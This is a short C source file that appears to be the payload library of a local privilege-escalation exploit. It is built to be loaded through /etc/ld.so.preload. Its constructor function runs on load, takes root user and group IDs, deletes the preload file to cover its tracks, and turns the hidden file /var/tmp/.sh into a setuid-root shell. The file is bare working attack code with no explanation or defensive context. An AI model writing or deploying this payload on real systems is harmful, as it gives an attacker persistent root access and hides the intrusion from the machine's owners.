#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
void init(void) __attribute__((constructor));                                                             
void __attribute__((constructor)) init() {
  if (setuid(0) || setgid(0))
    _exit(1);
  unlink("/etc/ld.so.preload");
  chown("/var/tmp/.sh", 0, 0);
  chmod("/var/tmp/.sh", 04755);
  _exit(0);
}
